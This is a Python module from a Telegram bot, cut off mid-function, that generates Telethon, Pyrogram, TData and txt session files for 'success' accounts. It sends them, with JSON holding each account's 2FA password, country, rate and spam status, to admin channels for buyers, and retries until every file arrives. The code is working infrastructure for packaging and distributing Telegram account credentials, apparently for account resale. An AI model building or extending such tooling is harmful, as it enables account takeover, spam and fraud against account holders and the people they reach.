# bot/services/session_reporting.py
"""Per-format session reporting for SUCCESS accounts.

Routes the success session to the channels enabled by the admin in
Session Management -> Success Session Mode:

    telethon  -> CHANNEL_VERIFIED
    pyrogram  -> CHANNEL_SUCCESS_PYROGRAM
    tdata     -> CHANNEL_SUCCESS_TDATA
    txt       -> CHANNEL_SUCCESS_TXT

Every format is reported independently and fail-safe: if one channel is not
configured, or one file fails to generate/send, the others still report. Only
formats that are toggled ON in the admin panel are reported; off formats are
skipped entirely (no partial/empty reports).
"""
import asyncio
import logging
import os
import shutil
import uuid
import zipfile

from bot import config
from bot.data.settings import get_session_success_types
from bot.services.channel_sender import send_to_channel_with_retry
from bot.services.session_formats import generate_txt_file, generate_tdata_folder, generate_pyrogram_file
from bot.utils.bg_tasks import spawn_background

# ---------------------------------------------------------------------------
# bot.verification.telethon_export is imported LAZILY on purpose.
#
# A module-level `from bot.verification.telethon_export import ...` executes
# bot/verification/__init__.py, which eagerly imports bot.verification.otp ->
# bot.verification.twofa -> bot.services.session_reporting, i.e. THIS module
# while it is still half-initialised. Whichever side is imported first then
# blows up with "cannot import name ... from partially initialized module",
# which made startup order-dependent (bot.recovery.worker imports this module
# first, so it failed there).
#
# The proxy below keeps the resolved function in a MODULE-LEVEL cache. It is
# deliberately not a function-scoped `from ... import` at the call sites: a
# function-local import makes the name local for the whole function body, so any
# use of it on a path that did not execute the import raises UnboundLocalError
# (the C2/C3 bug class this codebase was just audited for).
# ---------------------------------------------------------------------------
_resolve_user_access_hash_fn = None


async def resolve_user_access_hash(*args, **kwargs):
    """Lazy proxy for ``bot.verification.telethon_export.resolve_user_access_hash``."""
    global _resolve_user_access_hash_fn
    if _resolve_user_access_hash_fn is None:
        from bot.verification.telethon_export import (
            resolve_user_access_hash as _fn,
        )
        _resolve_user_access_hash_fn = _fn
    return await _resolve_user_access_hash_fn(*args, **kwargs)


logger = logging.getLogger(__name__)

# ------------------------------------------------------------------
#  In-process per-format delivery memory (no duplicate spam)
# ------------------------------------------------------------------
# When a format's session + JSON (or file for tdata/txt) has been delivered
# to its channel, the format is remembered here so that retry attempts
# (background retry, safety net, outer loops) do NOT re-send it.  This
# prevents flooding a channel with duplicate session files while waiting
# for another (temporarily down) format's channel to recover.
#
# Keyed by ``session_id``, value is a ``set`` of format names (telethon,
# pyrogram, tdata, txt) whose delivery completed.  In-memory only: after
# a restart any partial delivery is retried once (at-least-once semantics).
_delivered_ok: dict = {}


def _note_delivered(session_id: str, outcomes) -> None:
    """Remember every format that was fully delivered for this session."""
    if not session_id:
        return
    ok_list = _delivered_ok.get(session_id)
    if ok_list is None:
        ok_list = set()
        _delivered_ok[session_id] = ok_list
    for fmt, ok in outcomes:
        if ok:
            ok_list.add(fmt)


def _already_delivered(session_id: str) -> set:
    """Return the set of format names already delivered for this session."""
    if not session_id:
        return set()
    return _delivered_ok.get(session_id, set())


def _clear_delivery_memory(session_id: str) -> None:
    """Forget delivery state (session is finally resolved)."""
    _delivered_ok.pop(session_id, None)


# ------------------------------------------------------------------
#  Delivery truth helper: "all formats delivered" (files must NEVER miss)
# ------------------------------------------------------------------
# A success report is considered DELIVERED only when EVERY format that was
# actually attempted (its channel is configured) reached its channel - and
# only formats with a configured channel appear in ``outcomes`` at all. A
# format whose channel is not configured is skipped (logged loudly) and does
# NOT contribute to the result: it cannot be delivered, so retrying it is
# pointless. An empty ``outcomes`` (nothing configured) is NEVER treated as
# delivered, so ``channel_report_sent`` can only be set when real files went.
#
# This replaces the old ``any(ok for _fmt, ok in outcomes)`` checks, where a
# single successful format (e.g. telethon) masked a failed one (e.g. pyrogram
# JSON) - the report was marked "sent", the safety net never retried, and the
# buyer silently received a session file without its JSON (100% delivery rule
# violation).


def _all_attempted_formats_delivered(outcomes) -> bool:
    """True only when EVERY attempted format was fully delivered.

    ``outcomes`` is the ``(fmt, ok)`` list from ``report_success_session``.
    Returns False for an empty list (no format had a configured channel), so
    the caller never marks a report as sent without delivering any file.
    """
    if not outcomes:
        return False
    return all(ok for _fmt, ok in outcomes)


# ------------------------------------------------------------------
#  Channel-report delivery guarantee ("files must NEVER miss")
# ------------------------------------------------------------------
# When a success / pending / multidevice channel report cannot be delivered,
# we NEVER substitute a text report for a file (the owner only wants usable
# files). Instead the report is retried - first synchronously (bounded), then
# by an in-process background retry task, and finally by the monitor's
# per-cycle safety net (``retry_channel_report``), which also survives
# restarts via the persisted ``channel_report_pending`` marker.
_REPORT_RETRY_INTERVAL = float(os.getenv("CHANNEL_REPORT_RETRY_INTERVAL", "60"))
_REPORT_RETRY_MAX = int(os.getenv("CHANNEL_REPORT_RETRY_MAX", "30"))

# In-process guard so the background retry task and the monitor safety net
# never deliver the same session's files twice at the same time.
_retry_in_flight: set = set()


async def _retry_success_report_until_delivered(
    bot_client,
    session_id: str,
    phone: str,
    user_id,
    session_info,
    session_string: str,
    twofa_password: str,
    country_code: str,
    rate: float,
    account_status: str,
    status_details,
    success_report: str,
):
    """Background task: keep retrying a SUCCESS report until the files reach
    the channel (never a text substitute). On success the persisted
    ``channel_report_pending`` marker is cleared and ``channel_report_sent``
    set, so the monitor safety net does not double-deliver. After a restart
    the monitor safety net (``retry_channel_report``) takes over."""
    for attempt in range(1, _REPORT_RETRY_MAX + 1):
        await asyncio.sleep(_REPORT_RETRY_INTERVAL)
        try:
            # CRITICAL: atomically claim the report before each attempt.
            # The monitor safety net could try at the same time.
            from bot.utils.storage import try_claim_channel_report, release_channel_report
            if not try_claim_channel_report(session_id):
                print(f"⏭️ BACKGROUND RETRY: report already claimed/sent for {phone} (attempt {attempt})")
                return True  # another path delivered it
            delivered = False
            try:
                outcomes = await report_success_session(
                    bot_client=bot_client,
                    phone=phone,
                    user_id=user_id,
                    session_info=session_info,
                    session_string=session_string,
                    twofa_password=twofa_password,
                    country_code=country_code,
                    rate=rate,
                    account_status=account_status,
                    status_details=status_details,
                    success_report=success_report,
                    telethon_file=None,
                    pyrogram_file=None,
                    session_id=session_id,
                )
                delivered = _all_attempted_formats_delivered(outcomes)
            finally:
                release_channel_report(session_id, sent=delivered)
            if delivered:
                print(f"📤 BACKGROUND RETRY: SUCCESS report delivered for {phone} (attempt {attempt})")
                try:
                    from bot.utils.storage import replace_pending_session_data
                    info = dict(session_info or {})
                    info["channel_report_sent"] = True
                    info["channel_report_pending"] = False
                    replace_pending_session_data(session_id, info)
                except Exception as persist_err:
                    logger.warning("BACKGROUND RETRY: could not persist flags for %s: %s",
                                   session_id, persist_err)
                return True
        except Exception as e:
            logger.warning("BACKGROUND RETRY: SUCCESS report error for %s (attempt %d): %s",
                           phone, attempt, e)
        print(f"⚠️ BACKGROUND RETRY: SUCCESS report attempt {attempt}/{_REPORT_RETRY_MAX} failed for {phone}")
    print(f"❌ BACKGROUND RETRY: giving up on SUCCESS report for {phone} - monitor safety net will retry")
    return False

_FORMAT_CHANNELS = {
    "telethon": "CHANNEL_VERIFIED",
    "pyrogram": "CHANNEL_SUCCESS_PYROGRAM",
    "tdata": "CHANNEL_SUCCESS_TDATA",
    "txt": "CHANNEL_SUCCESS_TXT",
}


def _resolve_account_user_id(session_info, session_string, fallback):
    """Resolve the ACCOUNT's real Telegram user id (never the operator's id).

    Priority: ``session_info.user_id`` / ``account_id``, then parse from the
    session string itself, then the numeric fallback. The operator's user id
    used to be stamped into the pyrogram/tdata/txt files, which made those
    files carry the WRONG account identity.
    """
    if isinstance(session_info, dict):
        uid = session_info.get("user_id") or session_info.get("account_id")
        if uid:
            try:
                return int(uid)
            except (TypeError, ValueError):
                pass
    try:
        from bot.services.session_formats import parse_pyrogram_session
        parsed = parse_pyrogram_session(session_string or "")
        if parsed and parsed.get("user_id"):
            return int(parsed["user_id"])
    except Exception:
        pass
    try:
        return int(fallback or 0) or None
    except (TypeError, ValueError):
        return None


def _zip_folder(folder: str) -> str:
    """Zip a folder into a .zip next to it (with a safe arcname)."""
    zip_path = folder.rstrip("/\\") + ".zip"
    if os.path.exists(zip_path):
        os.remove(zip_path)
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        base = os.path.basename(folder.rstrip("/\\"))
        for dirpath, dirnames, filenames in os.walk(folder):
            dirnames[:] = [d for d in dirnames if d != "__pycache__"]
            for fn in filenames:
                full = os.path.join(dirpath, fn)
                arc = os.path.join(base, os.path.relpath(full, folder)).replace("\\", "/")
                zf.write(full, arc)
    return zip_path


async def report_success_session(
    bot_client,
    phone: str,
    user_id,
    session_info,
    session_string: str,
    twofa_password: str,
    country_code: str,
    rate: float,
    account_status: str,
    status_details,
    success_report: str,
    telethon_file=None,
    pyrogram_file=None,
    session_id: str = "",
):
    """Send the success session to every enabled format channel.

    ``telethon_file`` / ``pyrogram_file`` are optional pre-built files; if a
    format needs one and it is missing, it is generated on the fly.

    Returns a list of ``(format, ok)`` outcomes.
    """
    from bot.utils.session_handler import session_string_to_telethon

    enabled = get_session_success_types()
    outcomes = []
    work_dir = "verified_sessions"
    os.makedirs(work_dir, exist_ok=True)

    # The ACCOUNT's real Telegram user id - must land in the pyrogram/tdata/
    # txt files (the operator id was previously used, stamping wrong ids).
    account_user_id = _resolve_account_user_id(session_info, session_string, user_id)

    for fmt in enabled:
        # Skip formats already delivered in a previous dispatch attempt
        # (per-format delivery memory prevents duplicate session files while
        # retrying another format that temporarily failed).
        if fmt in _already_delivered(session_id):
            outcomes.append((fmt, True))
            continue
        channel_key = _FORMAT_CHANNELS.get(fmt)
        channel = config.get_channel(channel_key) if channel_key else None
        if not channel:
            # The admin selected this format but its dedicated channel is not
            # configured. NEVER fall back to another format's channel - that
            # cross-delivers (e.g. a pyrogram file into the verified channel)
            # and confuses buyers. Skip loudly so the admin notices.
            # CRITICAL: this format is NOT added to ``outcomes`` - a skipped
            # format must never poison the delivery truth (_all_attempted_
            # formats_delivered only considers formats that were attempted).
            logger.warning(
                "report_success_session: %s selected but channel %s is NOT "
                "configured - report skipped (no cross-channel fallback)",
                fmt, channel_key)
            continue
        try:
            ok = False
            if fmt == "telethon":
                ok = await _report_telethon(bot_client, channel, phone, session_string,
                                            success_report, telethon_file,
                                            session_id, session_info, twofa_password,
                                            user_id, country_code, rate, account_status,
                                            status_details, account_user_id=account_user_id)
            elif fmt == "pyrogram":
                ok = await _report_pyrogram(bot_client, channel, phone, session_string,
                                             success_report, pyrogram_file, work_dir,
                                             user_id=user_id, account_user_id=account_user_id,
                                             session_info=session_info,
                                             twofa_password=twofa_password,
                                             country_code=country_code, rate=rate,
                                             account_status=account_status,
                                             status_details=status_details)
            elif fmt == "tdata":
                ok = await _report_tdata(bot_client, channel, phone, session_string,
                                         success_report, work_dir, user_id=account_user_id,
                                         pyrogram_file=pyrogram_file)
            elif fmt == "txt":
                ok = await _report_txt(bot_client, channel, phone, session_string,
                                       account_user_id, success_report, work_dir)
            outcomes.append((fmt, ok))
        except Exception as e:
            logger.error("report_success_session: %s failed: %s", fmt, e)
            outcomes.append((fmt, False))

    # Remember every format that was fully delivered so the next attempt
    # (if any) does not re-send it, preventing duplicate channel files.
    _note_delivered(session_id, outcomes)
    # When ALL formats are delivered, release the delivery memory.
    if _all_attempted_formats_delivered(outcomes):
        _clear_delivery_memory(session_id)

    return outcomes


async def _report_telethon(bot_client, channel, phone, session_string, caption,
                           telethon_file, session_id, session_info, twofa_password,
                           user_id, country_code, rate, account_status, status_details,
                           account_user_id=None):
    """Telethon session + JSON -> channel.

    Returns True ONLY when BOTH the .session file AND its JSON actually
    reached the channel. Every step (generation, file send, JSON send) is
    retried so a transient failure cannot silently drop the JSON or session.
    """
    from bot.utils.session_handler import session_string_to_telethon

    # Resolve the ACCOUNT's real user id for the Telethon entity.
    if account_user_id is None:
        account_user_id = user_id
    try:
        account_user_id = int(account_user_id or 0) or None
    except (TypeError, ValueError):
        account_user_id = None
    first_name = ""
    if isinstance(session_info, dict):
        first_name = session_info.get("first_name") or ""

    # ---- 1) ensure the telethon .session file exists (generate with retry) ----
    safe = str(phone).replace('+', '')
    candidate = os.path.join("verified_sessions", f"{safe}_verified_telethon.session")
    # account_hash is resolved lazily (only when generation is needed) to avoid
    # a costly live-resolve network call (creates a temp client, connects to
    # Telegram, resolves the peer) when the telethon file already exists.
    account_hash = 0
    actual = telethon_file if telethon_file and os.path.exists(telethon_file) else None
    if not actual:
        # Resolve the ACCOUNT's REAL access hash ONCE before generation so the
        # on-the-fly file carries the real entity hash (never the placeholder 0).
        account_hash = await resolve_user_access_hash(
            session_string, phone, user_id=account_user_id,
        )
        for attempt in range(3):
            try:
                ok = await asyncio.to_thread(
                    session_string_to_telethon,
                    session_string, candidate,
                    user_id=account_user_id,
                    phone=phone,
                    first_name=first_name,
                    access_hash=account_hash,
                )
            except Exception as gen_err:
                ok = False
                logger.warning("Telethon on-the-fly generation failed (attempt %d) for %s: %s",
                               attempt + 1, phone, gen_err)
            if ok and os.path.exists(candidate):
                actual = candidate
                break
            if attempt < 2:
                await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
    if not actual or not os.path.exists(actual):
        logger.error("Telethon session file could NOT be produced for %s - no report sent", phone)
        return False

    # ---- 1.5) validate the generated .session file before sending ----
    from bot.services.session_formats import validate_session_file
    if not validate_session_file(actual, fmt="telethon"):
        logger.error("Telethon session file is structurally INVALID for %s - regenerating", phone)
        try:
            os.remove(actual)
        except Exception:
            pass
        actual = None
        # Resolve the access hash if the initial generation didn't run
        # (the file existed but was invalid, so hash was not resolved yet).
        if account_hash == 0:
            account_hash = await resolve_user_access_hash(
                session_string, phone, user_id=account_user_id,
            )
        # Retry generation once more (the existing retry loop below already
        # runs 3 attempts, but that loop only runs when actual is None or
        # missing; we just set it to None so the check below regenerates).
        for attempt in range(2):
            try:
                ok = await asyncio.to_thread(
                    session_string_to_telethon,
                    session_string, candidate,
                    user_id=account_user_id,
                    phone=phone,
                    first_name=first_name,
                    access_hash=account_hash,
                )
            except Exception as gen_err:
                ok = False
                logger.warning("Telethon re-generation failed (attempt %d) for %s: %s",
                               attempt + 1, phone, gen_err)
            if ok and os.path.exists(candidate):
                if validate_session_file(candidate, fmt="telethon"):
                    actual = candidate
                    break
            if attempt < 1:
                await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
        if not actual or not os.path.exists(actual) or not validate_session_file(actual, fmt="telethon"):
            logger.error("Telethon session file could NOT be repaired for %s - no report sent", phone)
            return False

    # ---- 2) send the .session file (retry) ----
    session_sent = False
    for attempt in range(3):
        try:
            result = await send_to_channel_with_retry(channel, document=actual, caption=caption, max_retries=3)
            if result is not None:
                session_sent = True
                print(f"📤 SUCCESS: Telethon session file sent to {channel} for {phone} (attempt {attempt + 1})")
                break
            logger.warning(f"Telethon session send returned None (attempt {attempt + 1}) for {phone}")
        except Exception as send_err:
            logger.warning(f"Telethon session send error (attempt {attempt + 1}) for {phone}: {send_err}")
        if attempt < 2:
            await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
    if not session_sent:
        logger.error("Telethon session file FAILED to reach channel %s for %s after retries", channel, phone)

    # ---- 3) JSON alongside (retry; return value now checked) ----
    json_ok = False
    try:
        from bot.services.reports import send_json_alongside
        json_ok = await send_json_alongside(
            chat_id=channel, bot_client=None, caption=caption,
            phone=phone, session_string=session_string,
            account_user_id=account_user_id, verified_by_user=user_id,
            session_info=session_info,
            suffix="telethon",
            twofa_password=twofa_password,
            country_code=country_code,
            rate=rate,
            account_status=account_status,
            status_details=status_details,
        )
        print(f"📤 SUCCESS: Telethon JSON sent to {channel} for {phone} (ok={json_ok})")
    except Exception as json_err:
        logger.error("Telethon JSON alongside FAILED for %s: %s", phone, json_err)

    return session_sent and json_ok


async def _report_pyrogram(bot_client, channel, phone, session_string, caption,
                           pyrogram_file, work_dir, user_id=0, account_user_id=None,
                           session_info=None,
                           twofa_password="", country_code="", rate=0.0,
                           account_status="spam_free", status_details=None):
    """Pyrogram session + JSON -> channel.

    Returns True ONLY when BOTH the .session file AND its JSON actually
    reached the channel (generation and both sends are retried).
    """
    # ---- 1) ensure the pyrogram .session file exists (generate with retry) ----
    candidate = os.path.join(work_dir, f"{str(phone).replace('+','')}_pyrogram.session")
    actual = pyrogram_file if pyrogram_file and os.path.exists(pyrogram_file) else None
    if not actual:
        for attempt in range(3):
            try:
                generated = await asyncio.to_thread(
                    generate_pyrogram_file, session_string, candidate,
                    user_id=account_user_id, phone=phone)
                if generated and os.path.exists(generated):
                    actual = generated
                    break
            except Exception as gen_err:
                logger.warning("Pyrogram on-the-fly generation failed (attempt %d) for %s: %s",
                               attempt + 1, phone, gen_err)
            if attempt < 2:
                await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
    if not actual or not os.path.exists(actual):
        logger.error("Pyrogram session file could NOT be produced for %s - no report sent", phone)
        return False

    # ---- 1.5) validate the generated .session file before sending ----
    from bot.services.session_formats import validate_session_file
    if not validate_session_file(actual, fmt="pyrogram"):
        logger.error("Pyrogram session file is structurally INVALID for %s - regenerating", phone)
        try:
            os.remove(actual)
        except Exception:
            pass
        actual = None
        for attempt in range(2):
            try:
                generated = await asyncio.to_thread(
                    generate_pyrogram_file, session_string, candidate,
                    user_id=account_user_id, phone=phone)
                if generated and os.path.exists(generated):
                    if validate_session_file(generated, fmt="pyrogram"):
                        actual = generated
                        break
            except Exception as gen_err:
                logger.warning("Pyrogram re-generation failed (attempt %d) for %s: %s",
                               attempt + 1, phone, gen_err)
            if attempt < 1:
                await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
        if not actual or not os.path.exists(actual) or not validate_session_file(actual, fmt="pyrogram"):
            logger.error("Pyrogram session file could NOT be repaired for %s - no report sent", phone)
            return False

    # ---- 2) send the .session file (retry) ----
    session_sent = False
    for attempt in range(3):
        try:
            result = await send_to_channel_with_retry(channel, document=actual, caption=caption, max_retries=3)
            if result is not None:
                session_sent = True
                print(f"📤 SUCCESS: Pyrogram session file sent to {channel} for {phone} (attempt {attempt + 1})")
                break
            logger.warning(f"Pyrogram session send returned None (attempt {attempt + 1}) for {phone}")
        except Exception as send_err:
            logger.warning(f"Pyrogram session send error (attempt {attempt + 1}) for {phone}: {send_err}")
        if attempt < 2:
            await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
    if not session_sent:
        logger.error("Pyrogram session file FAILED to reach channel %s for %s after retries", channel, phone)

    # ---- 3) JSON alongside (retry; return value now checked) ----
    json_ok = False
    try:
        from bot.services.reports import send_json_alongside
        json_ok = await send_json_alongside(
            chat_id=channel, bot_client=None, caption=caption,
            phone=phone, session_string=session_string,
            account_user_id=account_user_id, verified_by_user=user_id,
            session_info=session_info,
            suffix="pyrogram",
            twofa_password=twofa_password,
            country_code=country_code,
            rate=rate,
            account_status=account_status,
            status_details=status_details,
        )
        print(f"📤 SUCCESS: Pyrogram JSON sent to {channel} for {phone} (ok={json_ok})")
    except Exception as json_err:
        logger.error("Pyrogram JSON alongside FAILED for %s: %s", phone, json_err)

    return session_sent and json_ok


async def _build_tdata_report(channel, phone, session_string, work_dir, user_id,
                              pyrogram_file, caption):
    """Generate -> zip -> send the TData folder for the admin-selected format.

    Generation is CPU-bound (AES + zip), so it runs in a worker thread. It is
    retried once with both the session string and the Pyrogram ``.session``
    file as fallback auth-key sources, so a TData report is produced in almost
    every case. On total failure the error is logged loudly and ``None`` is
    returned: the caller NEVER substitutes a text message for a selected
    format (that substitution was the bug where "T Data doesn't go, a text
    goes instead").
    """
    folder = None
    last_err = None
    for attempt in range(2):
        try:
            folder = await asyncio.to_thread(
                generate_tdata_folder, phone, session_string, user_id,
                out_dir=work_dir, session_file=pyrogram_file,
            )
        except Exception as e:
            last_err = e
            folder = None
        if folder and os.path.isdir(folder):
            break
        if attempt == 0:
            await asyncio.sleep(0.3)
    if not folder or not os.path.isdir(folder):
        logger.error(
            "TData report: generation FAILED for %s (session len=%s, session_file=%r, err=%s) - "
            "no report delivered for the selected tdata format",
            phone, len(session_string or ""), pyrogram_file, last_err)
        return None
    zip_path = None
    try:
        zip_path = await asyncio.to_thread(_zip_folder, folder)
        if not zip_path or not os.path.exists(zip_path):
            logger.error("TData report: zipping FAILED for %s - no report delivered", phone)
            return None
        result = await send_to_channel_with_retry(channel, document=zip_path, caption=caption, max_retries=3)
        if result is None:
            logger.error("TData report: zip send FAILED for %s to channel %s", phone, channel)
            return None
        return result
    finally:
        try:
            shutil.rmtree(folder, ignore_errors=True)
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)
        except Exception:
            pass


async def _report_tdata(bot_client, channel, phone, session_string, caption, work_dir, user_id=0, pyrogram_file=None):
    sent = await _build_tdata_report(channel, phone, session_string, work_dir,
                                     user_id, pyrogram_file, caption)
    if sent:
        print(f"📤 SUCCESS: TData folder zip sent to {channel} for {phone}")
    return bool(sent)


async def _report_txt(bot_client, channel, phone, session_string, user_id, caption, work_dir):
    from bot import config
    txt_path = None
    for attempt in range(3):
        try:
            txt_path = generate_txt_file(phone, session_string, user_id,
                                         config.API_ID, config.API_HASH,
                                         out_dir=work_dir)
            if txt_path and os.path.exists(txt_path):
                break
        except Exception as gen_err:
            logger.warning("TXT generation failed (attempt %d) for %s: %s", attempt + 1, phone, gen_err)
        if attempt < 2:
            await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
    if not txt_path or not os.path.exists(txt_path):
        logger.error("TXT session file could NOT be produced for %s - no report sent", phone)
        return False
    sent = False
    for attempt in range(3):
        try:
            result = await send_to_channel_with_retry(channel, document=txt_path, caption=caption, max_retries=3)
            if result is not None:
                sent = True
                print(f"📤 SUCCESS: TXT session file sent to {channel} for {phone} (attempt {attempt + 1})")
                break
            logger.warning(f"TXT send returned None (attempt {attempt + 1}) for {phone}")
        except Exception as send_err:
            logger.warning(f"TXT send error (attempt {attempt + 1}) for {phone}: {send_err}")
        if attempt < 2:
            await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
    try:
        os.remove(txt_path)
    except Exception:
        pass
    return sent


# ------------------------------------------------------------------
# Pending / Multidevice reporting (single shared channel, max 1 format)
# ------------------------------------------------------------------

async def _report_selected_format_once(
    bot_client,
    selected: str,
    channel,
    phone: str,
    session_string: str,
    report_text: str,
    telethon_file,
    pyrogram_file,
    user_id,
    work_dir: str,
    account_user_id,
):
    """Try to produce + send the admin-selected format ONCE.

    Returns the sent Message object, or ``None`` when this single attempt could
    not deliver the file (the caller decides whether to retry - it never
    substitutes a text report for a file).
    """
    if selected == "telethon":
        actual = telethon_file if (telethon_file and os.path.exists(telethon_file)) else None
        if not actual:
            from bot.utils.session_handler import session_string_to_telethon
            from bot.services.session_formats import parse_pyrogram_session
            candidate = os.path.join(work_dir, f"{str(phone).replace('+', '')}_pending_telethon.session")
            # The Telethon entity must carry the ACCOUNT's real user id (from
            # the session string), never the operator's id.
            _acct_uid = None
            try:
                _parsed = parse_pyrogram_session(session_string)
                if _parsed and _parsed.get("user_id"):
                    _acct_uid = _parsed["user_id"]
            except Exception:
                _acct_uid = None
            if not _acct_uid:
                _acct_uid = user_id
            # Resolve the ACCOUNT's REAL access hash (reuse the OTP-time hash
            # from disk, otherwise resolve live) so the delivered file never
            # carries the placeholder hash=0.
            _acct_hash = await resolve_user_access_hash(
                session_string, phone, user_id=_acct_uid,
            )
            for attempt in range(3):
                try:
                    ok = await asyncio.to_thread(
                        session_string_to_telethon,
                        session_string, candidate,
                        user_id=_acct_uid,
                        phone=phone,
                        first_name="",
                        access_hash=_acct_hash,
                    )
                    if ok and os.path.exists(candidate):
                        actual = candidate
                        break
                except Exception as gen_err:
                    logger.warning("pending/md telethon generation failed (attempt %d): %s", attempt + 1, gen_err)
                if attempt < 2:
                    await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
        if actual and os.path.exists(actual):
            for attempt in range(3):
                result = await send_to_channel_with_retry(channel, document=actual, caption=report_text, max_retries=3)
                if result is not None:
                    return result
                logger.warning(f"pending/md telethon send returned None (attempt {attempt + 1}) for {phone}")
                if attempt < 2:
                    await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
        return None

    if selected == "pyrogram":
        actual = pyrogram_file if (pyrogram_file and os.path.exists(pyrogram_file)) else None
        if not actual:
            for attempt in range(3):
                try:
                    candidate = os.path.join(work_dir, f"{str(phone).replace('+', '')}_pending_pyrogram_{uuid.uuid4().hex[:8]}.session")
                    generated = await asyncio.to_thread(
                        generate_pyrogram_file, session_string, candidate,
                        user_id=account_user_id, phone=phone)
                    if generated and os.path.exists(generated):
                        actual = generated
                        break
                except Exception as gen_err:
                    logger.warning("pending/md pyrogram generation failed (attempt %d): %s", attempt + 1, gen_err)
                if attempt < 2:
                    await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
        if actual and os.path.exists(actual):
            for attempt in range(3):
                result = await send_to_channel_with_retry(channel, document=actual, caption=report_text, max_retries=3)
                if result is not None:
                    return result
                logger.warning(f"pending/md pyrogram send returned None (attempt {attempt + 1}) for {phone}")
                if attempt < 2:
                    await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
        return None

    if selected == "tdata":
        return await _build_tdata_report(
            channel, phone, session_string, work_dir, account_user_id,
            pyrogram_file, report_text)

    if selected == "txt":
        txt_path = None
        for attempt in range(3):
            try:
                txt_path = await asyncio.to_thread(
                    generate_txt_file, phone, session_string, account_user_id,
                    config.API_ID, config.API_HASH,
                    out_dir=work_dir, suffix=uuid.uuid4().hex[:8],
                )
                if txt_path and os.path.exists(txt_path):
                    break
            except Exception as gen_err:
                logger.warning("pending/md txt generation failed (attempt %d): %s", attempt + 1, gen_err)
            if attempt < 2:
                await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
        if txt_path and os.path.exists(txt_path):
            for attempt in range(3):
                result = await send_to_channel_with_retry(channel, document=txt_path, caption=report_text, max_retries=3)
                if result is not None:
                    try:
                        os.remove(txt_path)
                    except Exception:
                        pass
                    logger.info("report_pending_or_multidevice: txt report sent for %s (attempt %d)", phone, attempt + 1)
                    return result
                logger.warning(f"pending/md txt send returned None (attempt {attempt + 1}) for {phone}")
                if attempt < 2:
                    await asyncio.sleep(min(1.0 * (attempt + 1), 3.0))
            try:
                os.remove(txt_path)
            except Exception:
                pass
        return None

    return None


async def _retry_pending_or_multidevice_until_delivered(
    bot_client,
    mode: str,
    channel,
    phone: str,
    session_string: str,
    report_text: str,
    telethon_file,
    pyrogram_file,
    user_id,
):
    """Background task: keep retrying a pending/multidevice FILE until it
    reaches the channel (never a text substitute). The monitor's per-cycle
    safety net takes over after a restart (persisted channel_report_pending)."""
    for attempt in range(1, _REPORT_RETRY_MAX + 1):
        await asyncio.sleep(_REPORT_RETRY_INTERVAL)
        try:
            sent = await report_pending_or_multidevice(
                bot_client=bot_client,
                mode=mode,
                channel=channel,
                phone=phone,
                session_string=session_string or "",
                report_text=report_text,
                telethon_file=telethon_file,
                pyrogram_file=pyrogram_file,
                user_id=user_id,
            )
            if sent is not None:
                print(f"📤 BACKGROUND RETRY: {mode} file report delivered for {phone} (attempt {attempt})")
                return True
        except Exception as e:
            logger.warning("BACKGROUND RETRY: %s report error for %s (attempt %d): %s",
                           mode, phone, attempt, e)
        print(f"⚠️ BACKGROUND RETRY: {mode} report attempt {attempt}/{_REPORT_RETRY_MAX} failed for {phone}")
    print(f"❌ BACKGROUND RETRY: giving up on {mode} report for {phone} - monitor safety net will retry")
    return False


async def report_pending_or_multidevice(
    bot_client,
    mode: str,
    channel,
    phone: str,
    session_string: str,
    report_text: str,
    telethon_file=None,
    pyrogram_file=None,
    user_id=0,
):
    """Report a PENDING or MULTIDEVICE session to its shared channel.

    The admin selects at MOST ONE format (Session Management panel). Only that
    format's file is attached - the selected format ALWAYS goes (the instant
    report at OTP time and every later re-send). If the selected format cannot
    be produced, the whole attempt is RETRIED (generation + send) up to 3
    times with backoff. On total failure NOTHING is sent - never a text
    substitute (that substitution was the "T Data doesn't go, a text goes
    instead" bug). The caller then marks ``channel_report_pending`` so the
    monitor safety net keeps retrying until the file actually arrives.

    Returns the sent Message object (or ``None`` if nothing was delivered) so
    the caller can keep using the pending-message id for later edits.
    """
    from bot.data.settings import (
        get_session_pending_type,
        get_session_multidevice_type,
    )
    from bot.services.channel_sender import send_to_channel_with_retry

    if mode == "pending":
        selected = get_session_pending_type()
    elif mode == "multidevice":
        selected = get_session_multidevice_type()
    else:
        selected = ""

    logger.info("report_pending_or_multidevice: mode=%s selected=%r channel=%s phone=%s",
                mode, selected, channel, phone)

    work_dir = "verified_sessions"
    os.makedirs(work_dir, exist_ok=True)

    # Resolve the ACCOUNT's real user id for the generated files (the operator
    # id was previously stamped into pyrogram/tdata/txt files).
    account_user_id = _resolve_account_user_id(None, session_string, user_id)

    # Defensive fallback only: callers deliver the real session material
    # (session string + files) so the admin-selected format's FILE reaches
    # the channel. The old PENDING_FILE_REPORTS env gate (default OFF) made
    # callers strip the material, so every pending report degraded to a
    # text-only message. This branch remains ONLY for a session that has no
    # material at all.
    if not session_string and telethon_file is None and pyrogram_file is None:
        logger.info("report_pending_or_multidevice: no session material for %s "
                    "- sending text-only fallback for mode=%s", phone, mode)
        return await send_to_channel_with_retry(channel, message=report_text)

    try:
        # No selection -> the admin explicitly disabled session files for this
        # mode (Session Management -> "None"). Per the delivery rule, session
        # files only ship for Telethon / Program SUCCESS - never for pending or
        # multidevice when no format is selected. Deliver the report text only,
        # never a generated session file.
        if not selected:
            logger.info("report_pending_or_multidevice: no format selected for mode=%s "
                        "- sending text-only report to %s for %s", mode, channel, phone)
            return await send_to_channel_with_retry(channel, message=report_text)

        # Explicit format selected -> the FILE must reach the channel. Retry
        # the whole produce+send up to 3 times with backoff; NEVER fall back
        # to a text report for a failed file.
        for outer_attempt in range(1, 4):
            sent = await _report_selected_format_once(
                bot_client, selected, channel, phone, session_string,
